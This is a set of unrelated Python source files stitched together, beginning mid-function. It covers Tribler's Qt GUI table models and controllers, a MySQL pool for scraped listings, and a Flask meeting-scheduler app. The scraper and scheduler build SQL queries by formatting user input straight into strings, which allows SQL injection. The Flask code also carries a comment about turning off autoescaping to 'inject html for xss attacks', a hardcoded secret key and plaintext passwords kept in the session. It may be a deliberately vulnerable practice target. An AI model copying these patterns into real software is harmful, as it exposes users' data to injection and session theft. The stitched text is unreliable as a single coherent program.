        self.connect_timer.timeout.connect(self.connect)
        self.connect_timer.start(500)

    def connect(self, reschedule_on_err=True):
        self._logger.info("Will connect to events endpoint")
        self.reply = self.get(self.request)

        self.reply.readyRead.connect(self.on_read_data)
        self.reply.error.connect(lambda error: self.on_error(error, reschedule_on_err=reschedule_on_err))

from __future__ import absolute_import, division

from abc import abstractmethod

from PyQt5.QtCore import QAbstractTableModel, QModelIndex, Qt, pyqtSignal

from TriblerGUI.defs import ACTION_BUTTONS
from TriblerGUI.utilities import format_size, pretty_date


class RemoteTableModel(QAbstractTableModel):
    """
    The base model for the tables in the Tribler GUI.
    It is specifically designed to fetch data from a remote data source, i.e. over a RESTful API.
    """
    on_sort = pyqtSignal(str, bool)

    def __init__(self, parent=None):
        super(RemoteTableModel, self).__init__(parent)
        self.data_items = []
        self.item_load_batch = 50
        self.total_items = 0  # The total number of items without pagination
        self.infohashes = {}

    @abstractmethod
    def _get_remote_data(self, start, end, **kwargs):
        # This must call self._on_new_items_received as a callback when data received
        pass

    @abstractmethod
    def _set_remote_data(self):
        pass

    def reset(self):
        self.beginResetModel()
        self.data_items = []
        self.endResetModel()

    def sort(self, column, order):
        self.reset()
        self.on_sort.emit(self.columns[column], bool(order))

    def add_items(self, new_data_items):
        if not new_data_items:
            return
        # If we want to block the signal like itemChanged, we must use QSignalBlocker object
        old_end = self.rowCount()
        new_end = self.rowCount() + len(new_data_items)
        self.beginInsertRows(QModelIndex(), old_end, new_end - 1)
        self.data_items.extend(new_data_items)
        self.endInsertRows()


class TriblerContentModel(RemoteTableModel):
    column_headers = []
    column_width = {}
    column_flags = {}
    column_display_filters = {}

    def __init__(self, hide_xxx=False):
        RemoteTableModel.__init__(self, parent=None)
        self.data_items = []
        self.column_position = {name: i for i, name in enumerate(self.columns)}
        self.edit_enabled = False
        self.hide_xxx = hide_xxx

    def headerData(self, num, orientation, role=None):
        if orientation == Qt.Horizontal and role == Qt.DisplayRole:
            return self.column_headers[num]

    def _get_remote_data(self, start, end, **kwargs):
        pass

    def _set_remote_data(self):
        pass

    def rowCount(self, parent=QModelIndex()):
        return len(self.data_items)

    def columnCount(self, parent=QModelIndex()):
        return len(self.columns)

    def flags(self, index):
        return self.column_flags[self.columns[index.column()]]

    def data(self, index, role):
        if role == Qt.DisplayRole:
            column = self.columns[index.column()]
            data = self.data_items[index.row()][column] if column in self.data_items[index.row()] else u'UNDEFINED'
            return self.column_display_filters.get(column, str(data))(data) \
                if column in self.column_display_filters else data

    def add_items(self, new_data_items):
        super(TriblerContentModel, self).add_items(new_data_items)
        # Build reverse mapping from infohashes to rows
        items_len = len(self.data_items)
        new_items_len = len(new_data_items)
        for i, item in enumerate(new_data_items):
            if "infohash" in item:                    
                self.infohashes[item["infohash"]] = items_len - new_items_len + i

    def reset(self):
        self.infohashes.clear()
        super(TriblerContentModel, self).reset()

    def update_torrent_info(self, update_dict):
        row = self.infohashes.get(update_dict["infohash"])
        if row:
            self.data_items[row].update(**update_dict)
            self.dataChanged.emit(self.index(row, 0), self.index(row, len(self.columns)), [])


class SearchResultsContentModel(TriblerContentModel):
    """
    Model for a list that shows search results.
    """
    columns = [u'category', u'name', u'health', ACTION_BUTTONS]
    column_headers = [u'Category', u'Name', u'health', u'']
    column_flags = {
        u'category': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'name': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'health': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        ACTION_BUTTONS: Qt.ItemIsEnabled | Qt.ItemIsSelectable
    }

    def __init__(self, **kwargs):
        TriblerContentModel.__init__(self, **kwargs)
        self.type_filter = None


class ChannelsContentModel(TriblerContentModel):
    """
    This model represents a list of channels that can be displayed in a table view.
    """
    columns = [u'name', u'torrents', u'updated', u'subscribed']
    column_headers = [u'Channel name', u'Torrents', u'Updated', u'']
    column_flags = {
        u'name': Qt.ItemIsEnabled,
        u'torrents': Qt.ItemIsEnabled,
        u'updated': Qt.ItemIsEnabled,
        u'subscribed': Qt.ItemIsEnabled,
        ACTION_BUTTONS: Qt.ItemIsEnabled
    }
    column_display_filters = {
        u'updated': lambda date: pretty_date(date // 1000),
    }

    def __init__(self, subscribed=False, **kwargs):
        TriblerContentModel.__init__(self, **kwargs)
        self.subscribed = subscribed


class TorrentsContentModel(TriblerContentModel):
    columns = [u'category', u'name', u'size', u'health', ACTION_BUTTONS]
    column_headers = [u'Category', u'Name', u'Size', u'Health', u'']
    column_flags = {
        u'category': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'name': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'size': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'health': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        ACTION_BUTTONS: Qt.ItemIsEnabled | Qt.ItemIsSelectable
    }

    column_display_filters = {
        u'size': lambda data: format_size(float(data)),
    }

    def __init__(self, channel_pk='', **kwargs):
        TriblerContentModel.__init__(self, **kwargs)
        self.channel_pk = channel_pk


class MyTorrentsContentModel(TorrentsContentModel):
    columns = [u'category', u'name', u'size', u'status', ACTION_BUTTONS]
    column_headers = [u'Category', u'Name', u'Size', u'', u'']
    column_flags = {
        u'category': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'name': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'size': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        u'status': Qt.ItemIsEnabled | Qt.ItemIsSelectable,
        ACTION_BUTTONS: Qt.ItemIsEnabled | Qt.ItemIsSelectable
    }

    def __init__(self, channel_pk='', **kwargs):
        TorrentsContentModel.__init__(self, channel_pk=channel_pk, **kwargs)
        self.exclude_deleted = False
        self.edit_enabled = True

"""
This file contains various controllers for table views.
The responsibility of the controller is to populate the table view with some data, contained in a specific model.
"""
from __future__ import absolute_import

from six import text_type

from TriblerGUI.tribler_request_manager import TriblerRequestManager


def sanitize_for_fts(text):
    return text_type(text).translate({ord(u"\""): u"\"\"", ord(u"\'"): u"\'\'"})


def to_fts_query(text):
    if not text:
        return ""
    words = text.split(" ")

    # TODO: add support for quoted exact searches
    query_list = [u'\"' + sanitize_for_fts(word) + u'\"*' for word in words]

    return " AND ".join(query_list)


class TriblerTableViewController(object):
    """
    Base controller for a table view that displays some data.
    """

    def __init__(self, model, table_view):
        self.model = model
        self.model.on_sort.connect(self._on_view_sort)
        self.table_view = table_view
        self.table_view.setModel(self.model)
        self.table_view.verticalScrollBar().valueChanged.connect(self._on_list_scroll)
        self.request_mgr = None

    def _on_list_scroll(self, event):
        pass

    def _on_view_sort(self, column, ascending):
        pass

    def _get_sort_parameters(self):
        """
        Return a tuple (column_name, sort_asc) that indicates the sorting column/order of the table view.
        """
        sort_by = self.model.columns[self.table_view.horizontalHeader().sortIndicatorSection()]
        sort_asc = self.table_view.horizontalHeader().sortIndicatorOrder()
        return sort_by, sort_asc


class SearchResultsTableViewController(TriblerTableViewController):
    """
    Controller for the table view that handles search results.
    """

    def __init__(self, model, table_view, details_container, num_search_results_label=None):
        TriblerTableViewController.__init__(self, model, table_view)
        self.num_search_results_label = num_search_results_label
        self.details_container = details_container
        self.query = None
        table_view.selectionModel().selectionChanged.connect(self._on_selection_changed)

    def _on_selection_changed(self, _):
        selected_indices = self.table_view.selectedIndexes()
        if not selected_indices:
            return

        torrent_info = selected_indices[0].model().data_items[selected_indices[0].row()]
        if torrent_info['type'] == 'channel':
            self.details_container.hide()
            self.table_view.clearSelection()
            return

        self.details_container.show()
        self.details_container.details_tab_widget.update_with_torrent(selected_indices[0], torrent_info)

    def _on_view_sort(self, column, ascending):
        self.model.reset()
        self.load_search_results(self.query, 1, 50)

    def _on_list_scroll(self, event):
        if self.table_view.verticalScrollBar().value() == self.table_view.verticalScrollBar().maximum() and \
                self.model.data_items:  # workaround for duplicate calls to _on_list_scroll on view creation
            self.load_search_results(self.query)

    def load_search_results(self, query, start=None, end=None):
        """
        Fetch search results for a given query.
        """
        self.query = query

        if not start or not end:
            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch

        sort_by, sort_asc = self._get_sort_parameters()
        url_params = {
            "filter": to_fts_query(query),
            "first": start if start else '',
            "last": end if end else '',
            "sort_by": sort_by if sort_by else '',
            "sort_asc": sort_asc,
            "hide_xxx": self.model.hide_xxx,
            "metadata_type": self.model.type_filter if self.model.type_filter else ''
        }
        self.request_mgr = TriblerRequestManager()
        self.request_mgr.perform_request("search", self.on_search_results, url_params=url_params)

    def on_search_results(self, response):
        if not response:
            return

        self.model.total_items = response['total']

        if self.num_search_results_label:
            self.num_search_results_label.setText("%d results" % response['total'])

        if response['first'] >= self.model.rowCount():                    
            self.model.add_items(response['results'])                    


class ChannelsTableViewController(TriblerTableViewController):
    """
    This class manages a list with channels.
    """

    def __init__(self, model, table_view, num_channels_label=None, filter_input=None):
        TriblerTableViewController.__init__(self, model, table_view)
        self.num_channels_label = num_channels_label
        self.filter_input = filter_input

        if self.filter_input:
            self.filter_input.textChanged.connect(self._on_filter_input_change)

    def _on_filter_input_change(self, _):
        self.model.reset()
        self.load_channels(1, 50)

    def _on_view_sort(self, column, ascending):
        self.model.reset()
        self.load_channels(1, 50)

    def _on_list_scroll(self, event):
        if self.table_view.verticalScrollBar().value() == self.table_view.verticalScrollBar().maximum() and \
                self.model.data_items:  # workaround for duplicate calls to _on_list_scroll on view creation
            self.load_channels()

    def load_channels(self, start=None, end=None):
        """
        Fetch various channels.
        """
        if not start and not end:
            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch

        if self.filter_input and self.filter_input.text().lower():
            filter_text = self.filter_input.text().lower()
        else:
            filter_text = ''

        sort_by, sort_asc = self._get_sort_parameters()

        self.request_mgr = TriblerRequestManager()
        self.request_mgr.perform_request(
            "metadata/channels",
            self.on_channels,
            url_params={
                "first": start,
                "last": end,
                "sort_by": sort_by,
                "sort_asc": sort_asc,
                "filter": to_fts_query(filter_text),
                "hide_xxx": self.model.hide_xxx,
                "subscribed": self.model.subscribed})

    def on_channels(self, response):
        if not response:
            return

        self.model.total_items = response['total']

        if self.num_channels_label:
            self.num_channels_label.setText("%d items" % response['total'])

        if response['first'] >= self.model.rowCount():                    
            self.model.add_items(response['channels'])


class TorrentsTableViewController(TriblerTableViewController):
    """
    This class manages a list with torrents.
    """

    def __init__(self, model, torrents_container, num_torrents_label=None, filter_input=None):
        TriblerTableViewController.__init__(self, model, torrents_container.content_table)
        self.torrents_container = torrents_container
        self.num_torrents_label = num_torrents_label
        self.filter_input = filter_input
        torrents_container.content_table.selectionModel().selectionChanged.connect(self._on_selection_changed)

        if self.filter_input:
            self.filter_input.textChanged.connect(self._on_filter_input_change)

    def _on_selection_changed(self, _):
        selected_indices = self.table_view.selectedIndexes()
        if not selected_indices:
            return

        self.torrents_container.details_container.show()
        torrent_info = selected_indices[0].model().data_items[selected_indices[0].row()]
        self.torrents_container.details_tab_widget.update_with_torrent(selected_indices[0], torrent_info)

    def _on_filter_input_change(self, _):
        self.model.reset()
        self.load_torrents(1, 50)

    def _on_view_sort(self, column, ascending):
        self.model.reset()
        self.load_torrents(1, 50)

    def _on_list_scroll(self, event):
        if self.table_view.verticalScrollBar().value() == self.table_view.verticalScrollBar().maximum() and \
                self.model.data_items:  # workaround for duplicate calls to _on_list_scroll on view creation
            self.load_torrents()

    def load_torrents(self, start=None, end=None):
        """
        Fetch various torrents.
        """
        if not start and not end:
            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch

        if self.filter_input and self.filter_input.text().lower():
            filter_text = self.filter_input.text().lower()
        else:
            filter_text = ''

        sort_by, sort_asc = self._get_sort_parameters()

        self.request_mgr = TriblerRequestManager()
        self.request_mgr.perform_request(
            "metadata/channels/%s/torrents" % self.model.channel_pk,
            self.on_torrents,
            url_params={
                "first": start,
                "last": end,
                "sort_by": sort_by,
                "sort_asc": sort_asc,
                "hide_xxx": self.model.hide_xxx,
                "filter": to_fts_query(filter_text)})

    def on_torrents(self, response):
        if not response:
            return None

        self.model.total_items = response['total']

        if self.num_torrents_label:
            self.num_torrents_label.setText("%d items" % response['total'])

        if response['first'] >= self.model.rowCount():                    
            self.model.add_items(response['torrents'])
        return True


class MyTorrentsTableViewController(TorrentsTableViewController):
    """
    This class manages the list with the torrents in your own channel.
    """

    def load_torrents(self, start=None, end=None):
        """
        Fetch various torrents.
        """
        if not start and not end:
            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch

        if self.filter_input and self.filter_input.text().lower():
            filter_text = self.filter_input.text().lower()
        else:
            filter_text = ''

        sort_by, sort_asc = self._get_sort_parameters()

        self.request_mgr = TriblerRequestManager()
        self.request_mgr.perform_request(
            "mychannel/torrents",
            self.on_torrents,
            url_params={
                "sort_by": sort_by,
                "sort_asc": sort_asc,
                "filter": to_fts_query(filter_text),
                "exclude_deleted": self.model.exclude_deleted})

    def on_torrents(self, response):
        if super(MyTorrentsTableViewController, self).on_torrents(response):
            self.table_view.window().edit_channel_page.channel_dirty = response['dirty']
            self.table_view.window().edit_channel_page.update_channel_commit_views()

#!/usr/bin/python3

import logging
from datetime import datetime
from queue import Queue

import MySQLdb

from htmlscraper.listing import Listing

logger = logging.getLogger(__name__)

class MySQLConnectionPool:
    FIELDS_DICT = {'id': 'id', 'title': 'title', 'pubdate': 'publish_date',
                   'loc_id': 'location_id', 'addr': 'address', 'bedrooms': 'bedroom_qty',
                   'bathrooms': 'bathroom_qty', 'price': 'price', 'pet_friendly': 'pet_friendly_flag',
                   'furnished': 'furnished_flag', 'urgent': 'urgent_flag',
                   'url': 'url', 'size': 'size', 'desc': 'description'}

    def __init__(self, hostaddr, usr, pwd, dbname, size):
        logger.info('Initializing an instance of MySQLConnectionPool')
        logger.debug('Type checking for host address, username, password, database name and pool size')
        if type(hostaddr) != str:
            raise TypeError('hostaddr has to be a str')
        if type(usr) != str:
            raise TypeError('usr has to be a str')
        if type(pwd) != str:
            raise TypeError('pwd has to be a str')
        if type(dbname) != str:
            raise TypeError('dbname has to be a str')
        logger.debug('All type checks passed')

        logger.info('Initializing class variables')
        # save MySQL server authentication
        self._hostaddr = hostaddr
        self._usr = usr
        self._pwd = pwd
        self._dbname = dbname

        logger.info('Initializing MySQL connection pool')
        # initiate an empty Queue of required size
        self._pool = Queue(size)

        # fill the pool up
        for i in range(size):
            self._pool.put(MySQLdb.connect(hostaddr, usr, pwd, dbname), block=False)                    
        logger.info('Initialized MySQL connection pool')

    # return an available connection from the pool
    def get_connection(self):
        logger.debug('Retrieving connection from the pool')
        db = self._pool.get()

        logger.debug('Type checking connection')
        if not isinstance(db, MySQLdb.connections.Connection):
            raise TypeError('A connection has to be of type MySQLdb.connections.Connection')
            return -1

        logger.info('Successful MySQL connection get request')
        return db

    # queue a connection to the pool
    def put_connection(self, connection):
        logger.debug('Type checking connection')
        if not isinstance(connection, MySQLdb.connections.Connection):
            raise TypeError('A connection has to be of type MySQLdb.connections.Connection')
            return -1

        self._pool.put_nowait(connection)
        self._pool.task_done()
        logger.info('Successful MySQL connection put request')
        return 0

    # close all connections
    def clear_pool(self):
        logger.info('Closing the MySQL connection pool (id {})'.format(id(self)))
        while not self._pool.empty():
            db = self._pool.get()
            if not isinstance(db, MySQLdb.connections.Connection):
                raise TypeError('A non-Connection object found in the connection pool')
            db.close()
            self._pool.task_done()
        logger.info('Closed all connections in the MySQL connection pool (id {})'.format(id(self)))
        return 0

    # generate sql from a listing
    def gen_sql_insert(self, listing, cat_id):                    
        logger.debug('Generating MySQL command for insertion/update for table c{:d}'.format(cat_id))
        if listing.id < 0:
            logger.error('TypeError: id must be non-negative')
            logger.error('Skipping the Listing')
            return -1
        if type(listing.pubdate) != datetime:
            logger.error('TypeError: pubdate must be a datetime')
            return -1

        sql_cols = """INSERT INTO c{cat_id:d}({id:s}, {url:s}, {loc_id:s}, {title:s}, {pubdate:s}, {desc:s}""".format(
            cat_id=cat_id,
            **self.FIELDS_DICT)
        sql_vals = """) VALUES ({id:d}, '{url:s}', {loc_id:d}, '{title:s}', '{pubdate:s}', '{desc:s}'""".format(                    
            id=listing.id,                    
            url=listing.url,                    
            loc_id=listing.loc_id,                    
            title=listing.title,                    
            pubdate=listing.pubdate.strftime(                    
                '%Y-%m-%d %H:%M:%S'),                    
            desc=listing.description)                    

        col_list = [self.FIELDS_DICT['addr'], self.FIELDS_DICT['price'], self.FIELDS_DICT['bedrooms'],
                    self.FIELDS_DICT['bathrooms'], self.FIELDS_DICT['pet_friendly'], self.FIELDS_DICT['furnished'],
                    self.FIELDS_DICT['urgent'], self.FIELDS_DICT['size']]
        val_list = [listing.addr, listing.price, listing.bedrooms, listing.bathrooms, listing.pet_friendlly,                    
                    listing.furnished, listing.urgent, listing.size]                    
        sql_list = [lambda: "'{:s}'".format(listing.addr), lambda: "{:f}".format(listing.price),                    
                    lambda: "{:f}".format(listing.bedrooms),                    
                    lambda: "{:f}".format(listing.bathrooms), lambda: "{:d}".format(int(listing.pet_friendlly)),                    
                    lambda: "{:d}".format(int(listing.furnished)), lambda: "{:d}".format(int(listing.urgent)),                    
                    lambda: "{:f}".format(listing.size)]                    
        for i in range(len(col_list)):
            if val_list[i] != -1:
                sql_cols += ", " + col_list[i]
                sql_vals += ", " + sql_list[i]()                    

        output = sql_cols + sql_vals + ')'                    
        logger.debug('MySQL command generation successful')
        return output                    

    # add a list of listings into an existing table
    def update_table(self, listings, cat_id):                    
        logger.info('Updating table c{} in the MySQL database'.format(cat_id))
        logger.info('Requesting for MySQL connection')

        db = self.get_connection()
        cursor = db.cursor()

        for l in listings:
            if not isinstance(l, Listing):
                logger.error('TypeError: Expected a Listing instance')
                logger.error('Skipping this listing')
                continue

            logger.debug('Generating SQL command')                    

            sql = self.gen_sql_insert(l, cat_id)                    
            if sql == -1:
                # Failed to generate SQL command
                logger.error('Skipping the listing')
                continue

            try:
                logger.debug('Executing SQL command')
                cursor.execute(sql)                    
                logger.debug('Committing changes to the database')
                db.commit()
                logger.info('Successfully added a listing to table c{:d}'.format(cat_id))
            except:
                db.rollback()
                logger.error('Failed to add a listing to table c{:d}'.format(cat_id))
                logger.error('Rolled back the database changes')
        return 0

#!/usr/bin/env python
import uuid

def createCalendar(calendarName, day, username, sqlHandle):
  conn = sqlHandle.connect()
  cursor = conn.cursor()

  #Create a calendar

  userCheckQuery = "SELECT userId FROM Users WHERE userEmail = '{0}'".format(username)                    
  cursor.execute(userCheckQuery)
  userResult = cursor.fetchone()
  if userResult is None:
    #We found a user already in the db
    return (False, None)
  else:
    #Create item in Calendars
    calendarId = str(uuid.uuid4())


    if day == "":
      day = "2000-01-01"


    queryString = "INSERT INTO Calendars (calendarId, name, day, userId) VALUES('{0}','{1}', '{2}', {3})".format(calendarId, calendarName, day, userResult[0])                    
    cursor.execute(queryString)
    conn.commit()

    # Create item in TimeSlots
    queryString = """INSERT INTO TimeSlots (userId, calendarId, zero, one, two, three, four, five, six, seven, eight, nine,
                  ten, eleven, twelve, thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty, twentyone,
                  twentytwo, twentythree) VALUES({0},'{1}','','','','','','','','','','','','','','','','','','','','','','',                    
                  '','')""".format(userResult[0], calendarId)                    

    cursor.execute(queryString)
    conn.commit()

    return (True, calendarId)

def getCalendarList(username, sqlInstance):
  conn = sqlInstance.connect()
  cursor = conn.cursor()
  getCalendarDetails = "SELECT DISTINCT Calendars.calendarId, Calendars.name, Calendars.day FROM Users, Calendars, TimeSlots WHERE Calendars.calendarId = TimeSlots.calendarId AND (Calendars.userId = Users.userId OR TimeSlots.userId = Users.userId) AND Users.userEmail = '{0}'".format(username)                    
  cursor.execute(getCalendarDetails)
  result = cursor.fetchall()
  return result

def deleteCalendar(username, calendarId, sqlInstance):
  conn = sqlInstance.connect()
  cursor = conn.cursor()
  userCheckQuery = "SELECT userId FROM Users WHERE userEmail = '{0}'".format(username)                    
  cursor.execute(userCheckQuery)
  userResult = cursor.fetchone()
  conn.commit()
  if userResult is None:
    #We found a user already in the db
    return (False, None)
  else:	
    removeCalendar = "DELETE FROM Calendars WHERE calendarId = '{0}' AND userId = '{1}'".format(calendarId, userResult[0])                    
    print(removeCalendar)
    cursor.execute(removeCalendar)
    conn.commit()
    return "True"

def getCalendarDetails(id, sqlInstance):
  conn = sqlInstance.connect()
  cursor = conn.cursor()
  getCalendarDetails = "SELECT Calendars.calendarId, Calendars.name, Calendars.day, Users.userEmail  FROM Calendars, Users WHERE Calendars.userId = Users.userId AND Calendars.calendarId = '{0}'".format(id)                    
  cursor.execute(getCalendarDetails)
  result = cursor.fetchone()
  return result

def getCalendarDetails(id, sqlInstance):
  conn = sqlInstance.connect()
  cursor = conn.cursor()
  getCalendarDetails = "SELECT Calendars.calendarId, Calendars.name, Calendars.day, Users.userEmail  FROM Calendars, Users WHERE Calendars.userId = Users.userId AND Calendars.calendarId = '{0}'".format(id)                    
  cursor.execute(getCalendarDetails)
  result = cursor.fetchone()
  return result

def getAvailabilityForCalendar(calendarId, sqlInstance):
  conn = sqlInstance.connect()
  cursor = conn.cursor()
  queryString = "SELECT Users.userEmail,  TimeSlots.one, TimeSlots.two, TimeSlots.three, TimeSlots.four, TimeSlots.five, TimeSlots.six, TimeSlots.seven, TimeSlots.eight, TimeSlots.nine, TimeSlots.ten, TimeSlots.eleven, TimeSlots.twelve, TimeSlots.thirteen, TimeSlots.fourteen, TimeSlots.fifteen, TimeSlots.sixteen, TimeSlots.seventeen, TimeSlots.eighteen, TimeSlots.nineteen, TimeSlots.twenty, TimeSlots.twentyone, TimeSlots.twentytwo, TimeSlots.twentythree, TimeSlots.zero FROM TimeSlots, Users WHERE Users.userId = TimeSlots.userId AND TimeSlots.calendarId='{0}'".format(calendarId)                    
  cursor.execute(queryString)
  results = cursor.fetchall()
  return results

def getAvailability(username, calendarId, sqlInstance):
  conn = sqlInstance.connect()
  cursor = conn.cursor()

  userCheckQuery = "SELECT userId FROM Users WHERE userEmail = '{0}'".format(username)                    
  cursor.execute(userCheckQuery)
  result = cursor.fetchone()
  if result is None:
    return None
  else:
    queryString = """SELECT zero, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
                  thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty, twentyone,
                  twentytwo, twentythree FROM TimeSlots WHERE userID = {0} AND calendarId='{1}'""".format(result[0], calendarId)                    

    cursor.execute(queryString)
    result = cursor.fetchone()
    if result:
      return result
    else:
      return ('','','','','','','','','','','','','','','','','','','','','','','','')

def updateAvailability(username, calendarId, sqlInstance, timeList):
  conn = sqlInstance.connect()
  cursor = conn.cursor()

  userCheckQuery = "SELECT userId FROM Users WHERE userEmail = '{0}'".format(username)                    
  cursor.execute(userCheckQuery)
  userResult = cursor.fetchone()
  if userResult is None:
    return False
  else:
    timeslotQuery = "SELECT timeSlotId FROM TimeSlots WHERE calendarId = '{0}' AND userId = {1}".format(calendarId, userResult[0])                    
    cursor.execute(timeslotQuery)
    timeSlotResult = cursor.fetchone()
    if timeSlotResult:
      queryString = """UPDATE TimeSlots SET zero='{0}', one='{1}', two='{2}', three='{3}', four='{4}', five='{5}', six='{6}',                    
                  seven='{7}', eight='{8}', nine='{9}', ten='{10}', eleven='{11}', twelve='{12}', thirteen='{13}',                    
                  fourteen='{14}', fifteen='{15}', sixteen='{16}', seventeen='{17}', eighteen='{18}', nineteen='{19}',                    
                  twenty='{20}', twentyone='{21}', twentytwo='{22}', twentythree='{23}' WHERE userId = {24} AND calendarId='{25}'""".format(                    
                  timeList.get('0',''),timeList.get('1',''),timeList.get('2',''),timeList.get('3',''), timeList.get('4',''),
                  timeList.get('5',''),timeList.get('6',''),timeList.get('7',''),timeList.get('8',''), timeList.get('9',''),
                  timeList.get('10',''),timeList.get('11',''),timeList.get('12',''),timeList.get('13',''), timeList.get('14',''),
                  timeList.get('15',''),timeList.get('16',''),timeList.get('17',''),timeList.get('18',''), timeList.get('19',''),
                  timeList.get('20',''),timeList.get('21',''),timeList.get('22',''),timeList.get('23',''), userResult[0], calendarId)
      cursor.execute(queryString)
      conn.commit()
    else:
      queryString = """INSERT INTO TimeSlots (zero, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, thirteen,
                    fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty, twentyone, twentytwo, twentythree, userId, calendarId) VALUES ('{0}','{1}',                    
                    '{2}','{3}','{4}','{5}','{6}','{7}','{8}','{9}','{10}','{11}','{12}','{13}','{14}','{15}','{16}','{17}','{18}',                    
                    '{19}','{20}','{21}','{22}','{23}',{24},'{25}')""".format(                    
                    timeList.get('0',''),timeList.get('1',''),timeList.get('2',''),timeList.get('3',''), timeList.get('4',''),
                    timeList.get('5',''),timeList.get('6',''),timeList.get('7',''),timeList.get('8',''), timeList.get('9',''),
                    timeList.get('10',''),timeList.get('11',''),timeList.get('12',''),timeList.get('13',''), timeList.get('14',''),
                    timeList.get('15',''),timeList.get('16',''),timeList.get('17',''),timeList.get('18',''), timeList.get('19',''),
                    timeList.get('20',''),timeList.get('21',''),timeList.get('22',''),timeList.get('23',''), userResult[0], calendarId)
      cursor.execute(queryString)
      conn.commit()
  return True

#!/usr/bin/env python
from flaskext.mysql import MySQL

def registerUser(username, password, sqlHandle):
  conn = sqlHandle.connect()
  cursor = conn.cursor()

  #Check if there is a User already

  userCheckQuery = "SELECT * FROM Users WHERE userEmail = '{0}'".format(username)                    
  cursor.execute(userCheckQuery)
  result = cursor.fetchone()
  if result is not None:
    #We found a user already in the db
    return "Fail"
  else:
    queryString = "INSERT INTO Users (userEmail, password) VALUES('{0}', '{1}');".format(username, password)                    
    cursor.execute(queryString)
    conn.commit()
    return "Success"

#!/usr/bin/env python
from flaskext.mysql import MySQL
from werkzeug.security import generate_password_hash, check_password_hash

def validateCredentials(username, password, sqlInstance):
  conn = sqlInstance.connect()
  cursor = conn.cursor()

  #Check username and password matches in DB
  getUsernameAndPassword = "SELECT userEmail, password FROM Users WHERE userEmail = '{0}'".format(username)                    
  cursor.execute(getUsernameAndPassword)
  result = cursor.fetchone()
  if result is not None:
    return check_password_hash(result[1], password)

  return False

#!/usr/bin/env python
import sys
import ConfigParser as cp
from flask import Flask, render_template, request,redirect, url_for, session
from werkzeug.security import generate_password_hash, check_password_hash
from flaskext.mysql import MySQL
from MeetingScheduler import register as reg
from MeetingScheduler import user as usr
from MeetingScheduler import calendar

#Configuration setup
configPath = './config/mysql.config'
if len(sys.argv) == 2:
  configPath = sys.argv[1]

#Parse any external configuration options
parser = cp.ConfigParser()
parser.read(configPath)

user = parser.get('MySQLConfig', 'user')
password = parser.get('MySQLConfig', 'password')
db = parser.get('MySQLConfig', 'database')
host = parser.get('MySQLConfig', 'host')

mysql = MySQL()
app = Flask(__name__)
#Turn off autoescaping so we can inject html for xss attacks
app.config['MYSQL_DATABASE_USER'] = user
app.config['MYSQL_DATABASE_PASSWORD'] = password
app.config['MYSQL_DATABASE_DB'] = db
app.config['MYSQL_DATABASE_HOST'] = host
mysql.init_app(app)

app.secret_key = 'FKWNDJS(23/sd32!jfwedn/f,?REsdjtwed'

def isUserAuthorized():
  username, password = getUsernameAndPassword()
  response = usr.validateCredentials(username, password, mysql)
  return response

def getUsernameAndPassword():
  username = session.get('username', '')
  password = session.get('password', '')
  
  return (username, password)

@app.route("/")
def main():
  return render_template('user/login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
  if request.method == 'POST':
    #Try to register the user
    hashedPassword = generate_password_hash(request.form['password'])
    status = reg.registerUser(request.form['email'], hashedPassword, mysql)
    if status == 'Success':
      return render_template('user/register/success.html')
    else:
      return render_template('user/register/error.html', name=request.form['email'])
  else:
    #show the registration page
    return render_template('user/register/registration.html')

@app.route('/login', methods=['GET','POST'])
def login():
  if request.method == 'POST':
    response = usr.validateCredentials(request.form['username'], request.form['password'], mysql)
    if response:
      name=request.form['username']
      password= request.form['password']
      cursor = mysql.connect().cursor()
      cursor.execute('SELECT userId from Users WHERE userEmail="{0}";'.format(name))                    
      idNum = cursor.fetchall()
      cursor = mysql.connect().cursor()
      cursor.execute('SELECT name from Calendars WHERE userId="{0}";'.format(idNum))                    
      calendars = cursor.fetchall()
      session['username'] = name
      session['password'] = password
      return redirect(url_for('dashboard', calendars=calendars))
    else:
      return render_template('user/login-error.html')
  else:
    #show the login page
    return render_template('user/login.html')

@app.route("/dashboard", methods=['GET', 'POST'])
def dashboard():
  isAuthorized = isUserAuthorized()
  if not isAuthorized:
    return "Unauthorized"
  username, password = getUsernameAndPassword()
  if request.method == 'POST':
    return render_template('calendar/create/create.html')
  else:
    calendars = calendar.getCalendarList(username, mysql)
    return render_template('dashboard.html', calendars=calendars)

@app.route("/delete-calendar", methods=['GET', 'POST'])
def deleteCalendar():
  isAuthorized = isUserAuthorized()
  if not isAuthorized:
    return "Unauthorized"
  username, password = getUsernameAndPassword()
  calId = request.form['calendar']
  calendar.deleteCalendar(username, calId, mysql)
  calendars = calendar.getCalendarList(username, mysql)
  return redirect(url_for('dashboard', calendars=calendars))

@app.route('/create-calendar', methods=['GET', 'POST'])
def createCalendar():
  isAuthorized = isUserAuthorized()
  if not isAuthorized:
    return "Unauthorized"
  username, password = getUsernameAndPassword()
  if request.method == 'POST':
    #create the calendar and timeslots table for that calendar
    res, calendarId = calendar.createCalendar(request.form['calendarName'], request.form['day'], username, mysql)
    if res:
      return render_template('calendar/create/success.html', calendarId=calendarId)
    else:
      return render_template('calendar/error.html')
  else:
    #Display the create calendar page
    return render_template('calendar/create/create.html')


@app.route("/view-calendar", methods=['GET','POST'])
def viewCalendar():

  isAuthorized = isUserAuthorized()
  if not isAuthorized:
    return "Unauthorized"
